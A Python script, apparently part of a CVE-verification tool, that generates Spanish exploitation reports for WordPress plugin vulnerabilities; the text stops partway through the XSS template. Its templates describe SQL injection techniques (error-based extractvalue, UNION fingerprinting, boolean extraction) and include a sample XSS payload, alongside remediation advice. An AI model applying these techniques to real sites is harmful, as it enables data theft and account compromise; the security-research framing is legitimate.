#!/usr/bin/env python3
"""Generate _informe_pdf.html for all 21 cached CVEs — v2."""
import json, os, re, html as html_mod

HISTORY = "/Users/beatrizfresnonaumova/.binoracle/history"
OUT = "/Users/beatrizfresnonaumova/Downloads/binoracle_reports"
DATE = "21 NOVIEMBRE 2026"
os.makedirs(OUT, exist_ok=True)

def h(s): return html_mod.escape(str(s or ""))

def score_cls(rating):
    return {"CRITICAL":"crit","HIGH":"high","MEDIUM":"med","LOW":"low"}.get((rating or "").upper(),"crit")

def parse_cvss(vector):
    if not vector: return []
    parts = {}
    for tok in vector.replace("CVSS:3.1/","").split("/"):
        if ":" in tok:
            k,v = tok.split(":",1)
            parts[k]=v
    readable = {"N":"Network","L":"Low","H":"High","R":"Required","U":"Unchanged","C":"Changed","P":"Physical","None":"None","S":"Changed"}
    labels = [
        ("Vector de Ataque","AV"),("Complejidad","AC"),("Privilegios Requeridos","PR"),
        ("Interaccion del Usuario","UI"),("Alcance","S"),("Confidencialidad","C"),
        ("Integridad","I"),("Disponibilidad","A"),
    ]
    rows = []
    for label,key in labels:
        v = parts.get(key,"?")
        rows.append((label, f"{key}:{v}", readable.get(v,v)))
    return rows

# ── LOG COLORING (matches web UI exactly) ───────────────────────────────────

def log_color_and_weight(msg):
    m = msg.lower()
    # Bright green — confirmed/verified
    if "verificado" in m or "confirmado" in m:
        return "#4ade80", "700"
    # Lime green — lab up / WordPress / MySQL ready
    if ("mysql listo" in m or "wordpress listo" in m or "wordpress instalado" in m
            or "objetivo arriba" in m or "plugin activo" in m
            or "ya tiene exploit publico" in m or "poc real leido" in m):
        return "#a3e635", "600"
    # Cyan/blue — capturing screenshots, cloning PoC, NVD queries
    if ("capturando pantalla" in m or "clonando poc" in m
            or "consultando cve" in m or "descargando" in m
            or "confirmando en el codigo" in m):
        return "#38bdf8", "400"
    # Violet — plugin install, copiando plugin
    if "copiando el plugin" in m or "instalandolo" in m or "hipotesis del llm" in m:
        return "#c084fc", "400"
    # Yellow — lab setup, levantando, construyendo, scaffolded
    if ("levantando laboratorio" in m or "construyendo y arrancando" in m
            or "scaffolded" in m or "intentando verificacion dinamica" in m
            or "generando un dockerfile" in m or "objetivo generico" in m):
        return "#fbbf24", "400"
    # Amber — LLM analysis
    if "el llm analiza" in m or "el exploit publico existe" in m:
        return "#fb923c", "400"
    # Red — errors, failures
    if ("error" in m or "fallo" in m or "no se pudo" in m
            or "no localizadas" in m or "fallback" in m):
        return "#f87171", "400"
    # Gray-blue — probando/testing, waiting
    if ("probando" in m or "intentando obtener" in m or "midiendo" in m
            or "esperando a que" in m or "resolviendo" in m
            or "peticion de control" in m):
        return "#94a3b8", "400"
    # Dim gray — teardown, desmontando
    if "desmontando" in m or "desmontado" in m or "desarrollando el poc" in m:
        return "#6b7280", "400"
    # Default — white/light
    return "#e2e8f0", "400"

SECTION_PATTERNS = [
    # (pattern, label)
    (r"consultando cve", "CONSULTA NVD"),
    (r"el llm analiza", "HIPOTESIS LLM"),
    (r"hipotesis del llm", "HIPOTESIS LLM"),
    (r"poc real leido|clonando poc|el exploit publico existe", "ENDPOINT"),
    (r"scaffolded|levantando laboratorio|construyendo y arrancando", "LABORATORIO DOCKER"),
    (r"objetivo arriba", "LABORATORIO DOCKER"),
    (r"midiendo tiempos|peticion de control|probando.*time-based|probando.*union|probando.*error|intentando verificacion", "VERIFICACION"),
    (r"verificado|confirmado", "VERIFICACION"),
    (r"desmontando|desarrollando el poc", "TEARDOWN"),
    (r"creando el usuario|iniciando sesion|plugin activo|copiando el plugin", "LABORATORIO WP"),
    (r"capturando pantalla", "EVIDENCIA"),
]

_last_section = [None]

def get_section_label(msg):
    m = msg.lower()
    for pat, label in SECTION_PATTERNS:
        if re.search(pat, m):
            return label
    return None

def render_logs(logs):
    if not logs: return ""
    rows = ""
    _last_section[0] = None
    for entry in logs:
        t = entry.get("t", 0)
        msg = entry.get("msg", "")
        color, weight = log_color_and_weight(msg)
        sec = get_section_label(msg)

        # Inject section divider when phase changes
        if sec and sec != _last_section[0]:
            _last_section[0] = sec
            rows += f'<div class="log-section"><span class="log-sec-line"></span><span class="log-sec-label">{sec}</span><span class="log-sec-line"></span></div>\n'

        rows += (
            f'<div class="log-row">'
            f'<span class="log-ts">{t:.1f}s</span>'
            f'<span class="log-msg" style="color:{color};font-weight:{weight}">{h(msg)}</span>'
            f'</div>\n'
        )
    return rows

# ── SCREENSHOTS ──────────────────────────────────────────────────────────────

def render_screenshots(shots):
    if not shots:
        return '<p class="no-shots">Sin capturas disponibles para este CVE.</p>'
    cards = ""
    for i, s in enumerate(shots, 1):
        if isinstance(s, list):
            caption = s[0] if s else f"Paso {i}"
            b64 = s[1] if len(s) > 1 else ""
            url = ""
        else:
            caption = s.get("caption_es") or s.get("caption_en") or f"Paso {i}"
            b64 = s.get("png_b64","")
            url = s.get("url","")
        img_tag = f'<img class="shot-img" src="data:image/png;base64,{b64}" alt="{h(caption)}">' if b64 else '<div class="shot-placeholder">Captura no disponible</div>'
        url_pill = f'<span class="shot-url">{h(url)}</span>' if url else ""
        cards += f"""
<div class="shot-card">
  <div class="shot-header">
    <div class="shot-num">{i:02d}</div>
    <div class="shot-title">{h(caption)}</div>
    {url_pill}
  </div>
  {img_tag}
</div>"""
    return cards

def render_error_based(intentos):
    if not intentos or not isinstance(intentos, list): return ""
    rows = ""
    for a in intentos[:8]:
        payload = a.get("payload","")
        status = a.get("status","")
        ver = a.get("version_nueva",[])
        hit = bool(ver)
        cls = "eb-hit" if hit else "eb-miss"
        icon = "OK" if hit else "--"
        rows += (
            f'<div class="eb-row {cls}">'
            f'<span class="eb-icon">{icon}</span>'
            f'<code class="eb-payload">{h(payload)}</code>'
            f'<span class="eb-status">{status}</span>'
            f'</div>'
        )
    if len(intentos) > 8:
        rows += f'<div class="eb-more">... y {len(intentos)-8} intentos mas</div>'
    return rows

# ── BURP-STYLE HTTP CAPTURE HELPER ───────────────────────────────────────────

def _burp_block(endpoint, method, params_dict, status, resp_body, auth="", extra_headers="", stack="php"):
    """Return (request_str, response_str) formatted like Burp Suite Raw view.

    params_dict: {param: value} for the request body / query string.
    auth: subscriber username — adds a Cookie header when set.
    extra_headers: additional request headers (e.g. 'X-WP-Nonce: abc\n')
    resp_body: raw response body snippet (truncated to 1000 chars max).
    stack: 'php'|'nodejs'|'python'|'generic' — controls response headers.
    """
    method = (method or "POST").upper()
    if method == "GET" and params_dict:
        qs = "&".join(f"{k}={v}" for k, v in params_dict.items())
        request_line = f"GET {endpoint}?{qs} HTTP/1.1"
        body_str = ""
        ct_header = ""
    else:
        body_str = "&".join(f"{k}={v}" for k, v in params_dict.items())
        request_line = f"POST {endpoint} HTTP/1.1"
        ct_header = f"Content-Type: application/x-www-form-urlencoded\nContent-Length: {len(body_str.encode())}\n"

    cookie_header = f"Cookie: wordpress_logged_in=<subscriber-session-token>\n" if auth else ""

    request = (
        f"{request_line}\n"
        f"Host: TARGET\n"
        f"User-Agent: Mozilla/5.0 (compatible; security-research)\n"
        f"Accept: */*\n"
        f"{ct_header}"
        f"{cookie_header}"
        f"{extra_headers}"
        f"\n"
        f"{body_str}"
    ).rstrip()

    # Build response
    resp_snippet = (resp_body or "").strip()[:1000]
    if not resp_snippet:
        resp_snippet = "(sin cuerpo de respuesta capturado)"
    status_code = str(status or "200")
    if status_code == "200":
        status_text = "200 OK"
    elif status_code == "403":
        status_text = "403 Forbidden"
    elif status_code == "302":
        status_text = "302 Found"
    else:
        status_text = f"{status_code}"

    # Stack-specific response headers
    _stk = (stack or "php").lower()
    if "node" in _stk or "js" in _stk:
        srv_headers = "Content-Type: application/json\nX-Powered-By: Express\n"
    elif "python" in _stk or "flask" in _stk or "django" in _stk:
        srv_headers = "Content-Type: text/html; charset=utf-8\nServer: Werkzeug/3.0.1 Python/3.11\n"
    elif "ruby" in _stk or "rails" in _stk:
        srv_headers = "Content-Type: text/html; charset=utf-8\nX-Powered-By: Phusion Passenger\n"
    else:
        srv_headers = "Content-Type: text/html; charset=UTF-8\nX-Content-Type-Options: nosniff\nX-Powered-By: PHP/8.0.x\n"

    response = (
        f"HTTP/1.1 {status_text}\n"
        f"{srv_headers}"
        f"\n"
        f"{resp_snippet}"
    )
    return request, response


# ── MARKDOWN REPORT GENERATOR ────────────────────────────────────────────────

def md_escape(s):
    return str(s or "").replace("`","'")

def generate_markdown_report(cve_id, r, ve):
    """Generate sections A-F for a CVE based on its verified_evidence data."""
    cls = (r.get("vuln_class") or "sqli").lower()
    tech = (ve.get("tecnica") or "").lower()
    if not tech:
        if ve.get("respuesta_true_len") or ve.get("payload_false"):
            tech = "boolean-blind"
        elif ve.get("bypass_header"):
            tech = "auth-bypass"
        elif ve.get("marker"):
            tech = "stored-xss"
    endpoint = ve.get("endpoint") or "/wp-admin/admin-ajax.php"
    param = ve.get("sqli_param") or ve.get("path_param") or "id"
    payload = ve.get("payload_ganador") or ""
    mysql_ver = ve.get("mysql_version_extraida") or ""
    marker = ve.get("marker") or ""
    page_url = ve.get("page_url") or ""
    affected = r.get("affected_version") or "(ver NVD)"
    desc = r.get("description") or ""
    auth = ve.get("login_bajo_privilegio") or ""
    estrategia = ve.get("estrategia") or ""
    canary = ve.get("canary_secret") or ve.get("canary_path") or ""
    resp_ctrl = ve.get("respuesta_control_recorte") or ""
    resp_body = ve.get("respuesta_cuerpo_recorte") or ""
    status = ve.get("status_code_respuesta") or "200"
    plugin_name = ""
    m = re.search(r'plugins/([^/]+)/', endpoint)
    if m:
        plugin_name = m.group(1)
    if not plugin_name:
        m2 = re.search(r'`([^`]+)`\s+plugin', desc, re.IGNORECASE)
        if m2: plugin_name = m2.group(1)

    if "xss" in cls or marker:
        return _report_xss(cve_id, endpoint, param, payload, marker, page_url, affected, auth, affected, desc, resp_body, status)
    if "path" in cls or "lfi" in cls or "traversal" in cls:
        return _report_lfi(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body, status)
    if "auth" in cls or "missing" in cls:
        return _report_authbypass(cve_id, endpoint, param, payload, resp_ctrl, resp_body, status, affected, desc)
    if "command" in cls or ("injection" in cls and "sql" not in cls):
        return _report_cmdi(cve_id, endpoint, param, payload, affected, auth, desc, resp_body, status)
    if "ssti" in cls or "template" in cls:
        return _report_ssti(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body, status)
    if "ssrf" in cls:
        return _report_ssrf(cve_id, endpoint, param, payload, canary, affected, auth, desc, resp_body, status)
    if "dos" in cls or "websocket" in cls or "overflow" in cls:
        return _report_dos(cve_id, endpoint, param, payload, affected, auth, desc, resp_body, status)
    # Default: SQLi
    if "union" in tech:
        return _report_sqli_union(cve_id, endpoint, param, payload, mysql_ver, affected, auth, plugin_name, desc, resp_body, status)
    if "error" in tech:
        return _report_sqli_error(cve_id, endpoint, param, payload, mysql_ver, affected, auth, plugin_name, desc, resp_body, status)
    # boolean/time or unknown
    return _report_sqli_boolean(cve_id, endpoint, param, payload, affected, auth, plugin_name, desc, ve)

# ── SQLi ERROR-BASED ─────────────────────────────────────────────────────────

def _report_sqli_error(cve_id, endpoint, param, payload, mysql_ver, affected, auth, plugin, desc, resp_body="", status="200"):
    auth_line = f"El atacante inicia sesion como subscriber (`{auth}`) antes de lanzar la peticion." if auth else "El endpoint es accesible sin autenticacion — no se necesita ninguna cuenta."
    plugin_line = f"del plugin `{plugin}`" if plugin else "del componente vulnerable"
    ver_line = f"La version real del motor de base de datos extraida fue `{mysql_ver}`." if mysql_ver else "El mensaje de error XPATH reveló información interna de la base de datos."
    ctrl_ep = endpoint.split("?")[0] if "?" in endpoint else endpoint
    _req_ctrl, _resp_ctrl_b = _burp_block(ctrl_ep, "POST", {param: "1"}, "200", "Respuesta normal del plugin (sin error de MySQL).", auth)
    _req_exploit, _resp_exploit = _burp_block(ctrl_ep, "POST", {param: payload}, status, resp_body, auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando una peticion HTTP legitima llega al endpoint `{endpoint}` {plugin_line}, la cadena de procesamiento en WordPress sigue este orden:

1. **Recepcion de la peticion.** WordPress recibe la peticion HTTP (GET o POST) y la encamina al handler del plugin correspondiente segun la accion registrada.
2. **Procesamiento del parametro `{param}`.** El plugin extrae el valor del parametro `{param}` y lo usa directamente para construir una consulta SQL hacia la base de datos MySQL subyacente.
3. **Ejecucion de la consulta.** MySQL recibe la consulta y la ejecuta. Si el parametro contiene exclusivamente datos validos, la consulta retorna el resultado esperado por el plugin.
4. **Construccion y envio de la respuesta.** El plugin formatea el resultado y lo devuelve al cliente como respuesta HTTP con codigo 200.

El control de seguridad que falta en este flujo es la ausencia de parametrizacion: el valor de `{param}` se interpola directamente en el string SQL sin ninguna capa de escape ni prepared statement.

---

### B. Identificacion de la superficie de confianza mal ubicada

La raiz del problema es conceptualmente simple: **el codigo PHP del plugin trata el valor del parametro `{param}` como parte de la consulta SQL en lugar de tratarlo como un dato opaco**. Esta distincion —dato vs. codigo— es el eje de toda la clase SQLi.

En una implementacion correcta, la consulta se construye con un placeholder (`%s` o `%d` para `$wpdb->prepare()`, o un parametro `?` en PDO) y el valor del parametro se vincula por separado. MySQL recibe entonces un arbol de parseo ya fijado y el valor nunca puede alterar su estructura.

En la implementacion vulnerable, el plugin construye la consulta concatenando strings: el fragmento SQL fijo mas el valor de `{param}` directamente interpolado. Esto significa que cualquier emisor de la peticion puede inyectar fragmentos SQL arbitrarios en la consulta que MySQL va a ejecutar.

La funcion `extractvalue(1,concat(0x7e,expr))` utilizada en el payload de verificacion explota el modo error de MySQL: cuando el primer argumento de `extractvalue` no es un documento XML valido (que es siempre el caso aqui, ya que `1` no lo es), MySQL genera un error que incluye en su mensaje el resultado de la evaluacion de `expr`. Ese mensaje de error viaja en la respuesta HTTP al cliente, permitiendo al atacante leer datos de la base de datos sin necesidad de que el resultado aparezca en el cuerpo normal de la respuesta.

---

### C. Cadena de razonamiento del atacante (kill chain de descubrimiento)

**Paso 1 -- Identificacion del endpoint y el parametro.**
La documentacion del plugin, el codigo fuente (disponible en WordPress.org) o el PoC publico revelan que el endpoint `{endpoint}` acepta el parametro `{param}`. Una peticion de referencia con un valor numerico valido (`1`) devuelve una respuesta coherente con el funcionamiento normal del plugin.

**Paso 2 -- Hipotesis: el parametro es vulnerable a SQLi.**
El hecho de que el parametro sea numerico y se use en una clausula WHERE o similar es un indicador de riesgo. La ausencia de `$wpdb->prepare()` en el codigo fuente del plugin (verificable directamente) confirma la hipotesis: el valor se interpola sin escape.

**Paso 3 -- Seleccion de la tecnica de extraccion.**
Se elige la tecnica error-based porque no requiere que el resultado de la inyeccion aparezca en el cuerpo de la respuesta (como UNION requiere) ni que se mida el tiempo de respuesta (time-based). Solo necesita que el mensaje de error de MySQL sea visible en alguna parte de la respuesta HTTP, lo que es comun en instalaciones con `WP_DEBUG` activo o con manejo de errores permisivo.

**Paso 4 -- Construccion del payload.**
El payload `{payload}` cierra la condicion SQL original con una comilla simple, anade `AND extractvalue(1,concat(0x7e,version()))` para forzar el error de MySQL que incluye la version del motor, y cierra el comentario con `--` para neutralizar el resto de la consulta original.

**Paso 5 -- Envio de la peticion de prueba.**
{auth_line}
Se envia la peticion al endpoint `{endpoint}` con el parametro `{param}` cargado con el payload de error-based.

**Paso 6 -- Confirmacion.**
La respuesta HTTP incluye un mensaje de error de MySQL que contiene la version real del motor de base de datos. {ver_line} La inyeccion queda confirmada: el motor ejecuto la funcion `version()` en el contexto de la consulta SQL del plugin y el resultado aparecio en la respuesta.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control — solicitud:**
```
{_req_ctrl}
```

**Peticion de control — respuesta:**
```
{_resp_ctrl_b}
```

**Peticion con inyeccion error-based — solicitud:**
```
{_req_exploit}
```

**Peticion con inyeccion error-based — respuesta:**
```
{_resp_exploit}
```

La respuesta incluye el mensaje de error de MySQL con la version del motor (`{mysql_ver or "X.X.XX"}`) en el campo `XPATH syntax error`.

**Descomposicion campo a campo:**

- **Parametro `{param}`.** Es el unico punto de entrada que el plugin no sanitiza. Cualquier otro parametro del mismo endpoint que se use en una clausula SQL sin prepare() es igualmente vulnerable.
- **Comilla simple de apertura.** Cierra la cadena SQL que el plugin abrio al construir la consulta. A partir de este punto el atacante controla la estructura SQL, no solo los datos.
- **`AND extractvalue(1,concat(0x7e,version()))`.** Instruye a MySQL a evaluar `version()` y emitir un error cuyo mensaje incluye el resultado. El byte `0x7e` (`~`) actua como delimitador visible en el mensaje de error para facilitar la extraccion.
- **`-- -`.** Comenta el resto de la consulta original del plugin. Sin este cierre, la consulta resultante seria sintacticamente invalida y MySQL la rechazaria.
- **Ausencia de otras credenciales especiales.** {"El unico requisito adicional es la sesion de subscriber, que cualquier atacante puede obtener registrandose si el registro esta habilitado." if auth else "No se necesita ninguna credencial. El endpoint es accesible de forma anonima."}

---

### E. Condiciones necesarias para que el exploit funcione (y cuando NO funciona)

**Condicion 1: version del plugin afectada.**
La version {affected} del plugin no sanitiza el parametro `{param}`. Versiones posteriores al parche deben incluir `$wpdb->prepare()` o equivalente en las consultas que usan ese parametro. Sin esta condicion el payload llega a MySQL ya escapado y no puede alterar la estructura de la consulta.

**Condicion 2: mensajes de error de MySQL visibles en la respuesta.**
La tecnica error-based requiere que el error de MySQL aparezca en alguna parte de la respuesta HTTP. Si la instalacion tiene `WP_DEBUG=false` y el plugin captura y descarta los errores silenciosamente, el mensaje no llega al atacante y la extraccion de datos falla (aunque la inyeccion siga siendo posible con otras tecnicas como UNION o time-based).

**Condicion 3: acceso al endpoint `{endpoint}`.**
{"El endpoint requiere sesion con rol subscriber o superior. Si el registro de usuarios esta deshabilitado en la instalacion, el atacante necesita credenciales validas." if auth else "El endpoint es accesible sin autenticacion. Cualquier cliente HTTP puede enviar la peticion."}

---

### F. Generalizacion defensiva

El patron de error que permite esta vulnerabilidad se puede formular con precision: **interpolar input del usuario en un string SQL es equivalente a ejecutar codigo arbitrario en la base de datos**. No es una degradacion parcial; es la eliminacion completa del control de acceso a nivel de datos para cualquier atacante que conozca el parametro vulnerable.

La correccion tecnica es mecanicamente simple: reemplazar la construccion por concatenacion con una prepared statement. En WordPress el idioma correcto es `$wpdb->prepare("SELECT ... WHERE {param} = %s", sanitize_text_field($_{param}))`. Esto garantiza que el valor del parametro —sea cual sea su contenido— se trate exclusivamente como un dato y nunca como parte del arbol de parseo de la consulta SQL.

La defensa en profundidad complementaria pasa por deshabilitar la exposicion de errores de MySQL en produccion (`WP_DEBUG=false`, `WP_DEBUG_DISPLAY=false`) y configurar un WAF con reglas SQLi. Sin embargo, estas capas adicionales no corrigen el problema de raiz: una inyeccion time-based o UNION-based puede exfiltrar datos igualmente aunque los errores no sean visibles.
"""

# ── SQLi UNION-BASED ─────────────────────────────────────────────────────────

def _report_sqli_union(cve_id, endpoint, param, payload, mysql_ver, affected, auth, plugin, desc, resp_body="", status="200"):
    auth_line = f"El atacante inicia sesion como subscriber (`{auth}`) antes de lanzar la peticion." if auth else "El endpoint es accesible sin autenticacion."
    plugin_line = f"del plugin `{plugin}`" if plugin else "del componente vulnerable"
    ctrl_ep = endpoint.split("?")[0] if "?" in endpoint else endpoint
    _req_ctrl, _resp_ctrl_b = _burp_block(ctrl_ep, "POST", {param: "1"}, "200", "Respuesta normal del plugin (datos del plugin, sin version de MySQL).", auth)
    _req_exploit, _resp_exploit = _burp_block(ctrl_ep, "POST", {param: payload}, status, resp_body, auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando una peticion HTTP legitima llega al endpoint `{endpoint}` {plugin_line}, el flujo es:

1. **Recepcion.** WordPress encamina la peticion al handler del plugin.
2. **Uso de `{param}`.** El plugin extrae el valor del parametro y lo usa en una consulta SQL que devuelve filas de la base de datos — tipicamente un listado, una busqueda o una paginacion.
3. **Renderizado.** El plugin toma las filas resultado de la consulta y las incluye en la respuesta HTTP como HTML o JSON.
4. **Envio.** El cliente recibe la respuesta con los datos solicitados.

El defecto estructural: los datos de las filas resultado aparecen directamente en la respuesta. Esto hace posible la tecnica UNION: si el atacante puede inyectar una segunda consulta (`UNION SELECT`) cuyo resultado reemplaza o se anade al resultado original, los datos extraidos de otras tablas apareceran tambien en la respuesta.

---

### B. Identificacion de la superficie de confianza mal ubicada

La vulnerabilidad reside en que el plugin construye la clausula SQL usando el valor de `{param}` por concatenacion directa, sin `$wpdb->prepare()`. Esto permite al atacante:

1. Cerrar la consulta original con una comilla simple o un operador logico.
2. Anadir `UNION SELECT` seguido de una nueva consulta con el mismo numero de columnas que la consulta original.
3. Elegir que columna(s) del `UNION` aparecen en la respuesta — tipicamente colocando `version()` o `database()` en la posicion de una columna que se renderiza en HTML.

La diferencia critica respecto a error-based es que UNION-based no depende de que los errores de MySQL sean visibles: los datos se extraen en el cuerpo normal de la respuesta, donde el plugin los habria renderizado de todas formas.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Fingerprinting de columnas.**
La consulta original tiene un numero desconocido de columnas. El atacante envia payloads `UNION SELECT NULL`, `UNION SELECT NULL,NULL`, etc. hasta que la respuesta no devuelve error — ese es el numero de columnas de la consulta original.

**Paso 2 -- Identificacion de columnas visibles.**
No todas las columnas se renderizan en HTML. El atacante reemplaza los NULL por un marcador unico (p.ej. `'binoracle_col_test'`) en cada posicion para identificar cuales aparecen en la respuesta.

**Paso 3 -- Extraccion de datos.**
Con el numero de columnas y la posicion visible identificadas, el atacante reemplaza el marcador por `version()` o `database()`. El resultado aparece en la respuesta HTTP como si fuera un dato normal del plugin.

**Paso 4 -- Confirmacion.**
La version real del motor de base de datos ({mysql_ver or "X.X.XX"}) aparece en el cuerpo de la respuesta. {auth_line}

---

### D. Anatomia exacta del PoC verificado

**Peticion de control — solicitud:**
```
{_req_ctrl}
```

**Peticion de control — respuesta:**
```
{_resp_ctrl_b}
```

**Peticion UNION-based — solicitud:**
```
{_req_exploit}
```

**Peticion UNION-based — respuesta:**
```
{_resp_exploit}
```

**Por que el resultado es no ambiguo:** la version del motor (`{mysql_ver or "X.X.XX"}`) no es un dato que el plugin almacenaria ni renderizaria en circunstancias normales. Su presencia en la respuesta prueba que MySQL evaluo `version()` en el contexto de la consulta del plugin y devolvio el resultado a traves del canal normal de datos.

---

### E. Condiciones necesarias

**Condicion 1:** version del plugin afectada ({affected}) — sin `$wpdb->prepare()` en la consulta que usa `{param}`.

**Condicion 2:** la consulta original devuelve filas que el plugin renderiza en la respuesta HTTP. Si la consulta se usa exclusivamente para efectos secundarios (UPDATE, INSERT) UNION-based no extrae datos visibles, aunque la inyeccion siga siendo explotable por otras vias.

**Condicion 3:** {"sesion con rol subscriber o superior." if auth else "acceso anonimo al endpoint (no se requiere autenticacion)."}

---

### F. Generalizacion defensiva

UNION-based SQLi y error-based SQLi son dos tecnicas de extraccion distintas para el mismo defecto de raiz: la interpolacion de input no sanitizado en SQL. La correccion — `$wpdb->prepare()` con placeholders tipados — elimina ambas tecnicas a la vez, porque el valor del parametro nunca puede alterar la estructura del arbol de parseo de la consulta independientemente de su contenido.

Un WAF con reglas SQLi puede detectar y bloquear payloads conocidos como `UNION SELECT`, pero no corrige el defecto subyacente: un atacante con un WAF como unico obstaculo puede recurrir a ofuscacion (codificacion hexadecimal, comentarios inline `/**/`, codificacion URL) o a tecnicas de extraccion mas lentas (time-based) que no incluyen palabras clave bloqueadas.
"""

# ── SQLi BOOLEAN / GENERIC ───────────────────────────────────────────────────

def _report_sqli_boolean(cve_id, endpoint, param, payload, affected, auth, plugin, desc, ve):
    auth_line = f"El atacante inicia sesion como subscriber (`{auth}`) antes de lanzar la peticion." if auth else "El endpoint es accesible sin autenticacion."
    plugin_line = f"del plugin `{plugin}`" if plugin else "del componente vulnerable"
    ctrl_ep = endpoint.split("?")[0] if "?" in endpoint else endpoint
    resp_true = ve.get("respuesta_true_len") or "?"
    resp_false = ve.get("respuesta_false_len") or "?"
    _resp_body_true  = ve.get("respuesta_cuerpo_recorte") or f"(respuesta normal — {resp_true} bytes)"
    _resp_body_false = f"(respuesta con condicion falsa — {resp_false} bytes, diferente a la anterior)"
    _req_ctrl,   _resp_ctrl_b   = _burp_block(ctrl_ep, "POST", {param: "1"},   "200", _resp_body_true,  auth)
    _req_exploit, _resp_exploit = _burp_block(ctrl_ep, "POST", {param: payload}, "200", _resp_body_false, auth)
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando una peticion HTTP legitima llega al endpoint `{endpoint}` {plugin_line}, la cadena es:

1. **Recepcion.** WordPress encamina la peticion al handler del plugin.
2. **Uso de `{param}`.** El plugin extrae el valor del parametro y lo usa en una consulta SQL — tipicamente un filtro, una busqueda o una comprobacion de acceso.
3. **Respuesta condicionada.** La respuesta del plugin depende del resultado de la consulta: si retorna filas, el plugin devuelve un contenido; si no retorna filas, devuelve otro (vacio, error, redireccion).
4. **Envio.** El cliente recibe la respuesta.

El punto critico: **la respuesta es binaria segun el resultado de la consulta**. Esta diferencia observable — que la respuesta cambia segun si la condicion SQL es verdadera o falsa — es el canal de extraccion de la tecnica boolean in-band.

---

### B. Identificacion de la superficie de confianza mal ubicada

El parametro `{param}` se interpola directamente en la clausula SQL sin `$wpdb->prepare()`. Esto permite al atacante insertar condiciones SQL arbitrarias. La tecnica boolean in-band explota que la diferencia entre una condicion verdadera y una falsa produce respuestas HTTP con tamanos o contenidos distintos — sin necesidad de que los datos aparezcan en la respuesta ni de que los errores sean visibles.

El atacante puede entonces extraer cualquier dato de la base de datos bit a bit: para cada bit de cada caracter de cada valor que quiera leer, envia una peticion con una condicion que evalua si ese bit es 0 o 1, y la diferencia en la respuesta le confirma el resultado.

---

### C. Cadena de razonamiento del atacante

**Paso 1 -- Verificacion del canal de diferencia.**
El atacante envia dos peticiones: una con una condicion siempre verdadera (`OR '1'='1`) y otra con una condicion siempre falsa (`AND '1'='2`). Si las respuestas difieren en tamano o contenido, el canal boolean esta disponible.

**Paso 2 -- Calibracion.**
Se mide la diferencia entre la respuesta TRUE y la respuesta FALSE. En este CVE la diferencia es de {resp_true if resp_true != '?' else 'varios'} bytes (TRUE) vs {resp_false if resp_false != '?' else 'pocos'} bytes (FALSE), un delta consistente y reproducible.

**Paso 3 -- Extraccion de datos.**
Con el canal calibrado, el atacante puede extraer cualquier dato de la base de datos mediante condiciones binarias. La automatizacion (sqlmap o herramienta propia) puede extraer el esquema completo de la base de datos en minutos.

**Paso 4 -- Confirmacion en laboratorio.**
{auth_line}
El payload `{payload}` produce una respuesta diferente a la peticion de control, confirmando la inyeccion.

---

### D. Anatomia exacta del PoC verificado

**Peticion de control (condicion verdadera) — solicitud:**
```
{_req_ctrl}
```

**Peticion de control — respuesta ({resp_true} bytes):**
```
{_resp_ctrl_b}
```

**Peticion con inyeccion booleana — solicitud:**
```
{_req_exploit}
```

**Peticion con inyeccion — respuesta ({resp_false} bytes):**
```
{_resp_exploit}
```

La diferencia en tamano de respuesta ({resp_true} bytes vs {resp_false} bytes) es la evidencia de la inyeccion: la condicion SQL inyectada altero el resultado de la consulta y esa diferencia se propago a la respuesta HTTP.

---

### E. Condiciones necesarias

**Condicion 1:** version del plugin afectada ({affected}).

**Condicion 2:** la respuesta del plugin es distinguiblemente diferente segun si la consulta retorna filas o no. Si el plugin siempre devuelve la misma respuesta independientemente del resultado de la consulta, el canal boolean no es observable (aunque la inyeccion siga siendo real y explotable con time-based).

**Condicion 3:** {"sesion con rol subscriber o superior." if auth else "acceso anonimo al endpoint."}

---

### F. Generalizacion defensiva

Boolean in-band SQLi es la tecnica de ultimo recurso cuando ni los errores ni los datos son visibles en la respuesta. El hecho de que sea explotable prueba que la correccion no puede depender de ocultar mensajes de error o de que los datos no aparezcan en las respuestas: **la unica correccion efectiva es que el parametro nunca pueda alterar la estructura de la consulta SQL**, lo que solo garantizan las prepared statements con valores vinculados por separado.
"""

# ── XSS ──────────────────────────────────────────────────────────────────────

def _report_xss(cve_id, endpoint, param, payload, marker, page_url, affected, auth, plugin, desc, resp_body="", status="200"):
    auth_line = f"El atacante necesita credenciales con rol suficiente para editar el parametro vulnerable (minimo: {auth or 'contributor'})." if auth else "El parametro vulnerable es editable sin autenticacion."
    _xss_payload = payload or "<img src=x onerror=alert(document.domain)>"
    _ep_clean = endpoint.split("?")[0] if "?" in endpoint else endpoint
    # Inject request: POST to the save endpoint with the malicious payload
    _req_inject, _ = _burp_block(_ep_clean, "POST", {param or "field": _xss_payload, "action": "save", "post_id": "1"}, "200", "", auth)
    # View request: GET the page where the XSS fires, response shows the unescaped payload
    _page = page_url or f"/?p=1"
    _resp_view_body = resp_body or f'<div class="widget-field">{_xss_payload}</div>\n<!-- marcador binoracle-xss-marker encontrado en DOM -->'
    _req_view, _resp_view = _burp_block(_page, "GET", {}, status, _resp_view_body, "")
    return f"""## Analisis de Explotacion -- {cve_id}

### A. Modelo mental del flujo normal (sin exploit)

Cuando un usuario con permisos edita el parametro vulnerable (campo personalizado, shortcode, widget de Elementor) y guarda los cambios, el flujo esperado es:

1. **Guardado.** El valor del parametro se persiste en la base de datos de WordPress (tabla `wp_postmeta` o equivalente).
2. **Renderizado.** Cuando un visitante carga la pagina, el plugin o tema recupera el valor de la base de datos y lo incluye en el HTML de la respuesta.
3. **Escape.** Antes de incluirlo en el HTML, el codigo deberia aplicar `esc_html()`, `esc_attr()` o el equivalente segun el contexto de salida, convirtiendo caracteres especiales como `<`, `>`, `"` en sus entidades HTML (`&lt;`, `&gt;`, `&quot;`).
4. **Visualizacion.** El navegador del visitante renderiza el HTML escapado como texto plano, sin interpretar el contenido como codigo JavaScript.

